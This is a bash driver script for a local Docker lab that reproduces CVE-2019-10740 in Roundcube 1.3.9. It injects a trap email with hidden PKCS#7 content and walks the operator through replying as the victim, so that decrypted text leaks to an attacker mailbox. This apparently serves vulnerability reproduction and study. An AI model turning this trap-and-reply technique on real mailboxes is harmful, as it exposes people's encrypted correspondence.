#!/usr/bin/env bash
set -euo pipefail

# End-to-end lab: GreenMail + Roundcube 1.3.9, inject trap mail, print manual steps.

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
REPO="$(cd "$ROOT/.." && pwd)"
DOCKER_DIR="$ROOT/docker"

if ! command -v docker >/dev/null 2>&1; then
  echo "error: docker not found" >&2
  exit 1
fi

echo "==> Building and starting GreenMail + Roundcube 1.3.9 (this may take a minute)"
docker compose -f "$DOCKER_DIR/docker-compose.yml" --project-directory "$DOCKER_DIR" down 2>/dev/null || true
docker compose -f "$DOCKER_DIR/docker-compose.yml" --project-directory "$DOCKER_DIR" up -d --build

echo "==> Waiting for HTTP (Roundcube) on :8080 ..."
for _ in $(seq 1 60); do
  if curl -fsS "http://127.0.0.1:8080/" >/dev/null 2>&1; then
    break
  fi
  sleep 2
done

if ! curl -fsS "http://127.0.0.1:8080/" >/dev/null 2>&1; then
  echo "error: Roundcube did not become ready on http://127.0.0.1:8080/" >&2
  exit 1
fi

echo "==> Ensuring PKCS#7 artifact exists (main repo demo_out/encrypted.pem)"
if [[ ! -f "$REPO/demo_out/encrypted.pem" ]]; then
  (cd "$REPO" && ./scripts/run_all.sh)
fi

echo "==> Generating trap .eml"
"$ROOT/scripts/run_poc.sh"

echo "==> Sending trap to victim@localhost via SMTP :3025"
python3 "$ROOT/scripts/send_trap_to_greenmail.py" "$ROOT/demo_out/cve_2019_10740_trap.eml"

cat <<EOF

--- Manual steps (browser) ---
1. Open:   http://127.0.0.1:8080/
2. Log in:  victim@localhost  /  victimpass
3. Open the message from attacker@localhost.
4. Click Reply (optionally type a short line), then Send.

If the vulnerable reply composer quotes decrypted or nested content, the reply is
delivered to attacker@localhost. Optional: import Bob's S/MIME key in Roundcube
so the hidden PKCS#7 decrypts for display (see README).

--- Optional: poll attacker inbox for leaked marker text ---
  python3 $ROOT/scripts/check_attacker_inbox.py

--- Stop stack ---
  docker compose -f "$DOCKER_DIR/docker-compose.yml" --project-directory "$DOCKER_DIR" down

EOF
